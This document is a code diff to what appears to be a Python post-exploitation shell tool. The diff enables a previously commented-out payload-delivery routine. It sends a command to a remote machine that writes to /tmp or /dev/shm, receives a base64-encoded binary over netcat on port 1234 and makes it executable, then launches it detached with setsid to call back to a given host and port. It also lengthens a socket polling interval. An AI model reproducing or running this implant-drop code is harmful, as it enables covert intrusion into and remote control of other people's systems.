@@ -111,7 +111,7 @@ class NetShell(cmd.Cmd):
             except Exception as e:
                 logging.error(f"Unexpected exception when checking if a socket is closed: {e}")
                 break
-            time.sleep(1)
+            time.sleep(10)
 
     """
         <--Commands start here-->
@@ -277,16 +277,16 @@ class LocalShell(cmd.Cmd):
             try:
                 logging.info(f"Sending payload")
 
-                # test = sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ; nc -lnp 1234 | base64 -d > payload ;\n".encode())
-                # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
-                # time.sleep(1)
-                # test = pretty(sock.send_command("./payload --test"))
+                test = sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ; nc -lnp 1234 | base64 -d > payload ;\n".encode())
+                send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
+                time.sleep(1)
+                test = pretty(sock.send_command("./payload --test"))
 
-                # if not test == "Hello world! Wasd":
-                #     logging.error("Thing did not run")
-                #     raise Exception
+                if not test == "Hello world! Wasd":
+                    logging.error("Thing did not run")
+                    raise Exception
 
-                # sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
+                sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
 
                 sock.server_socket.close()
                 sock.client_socket.close()
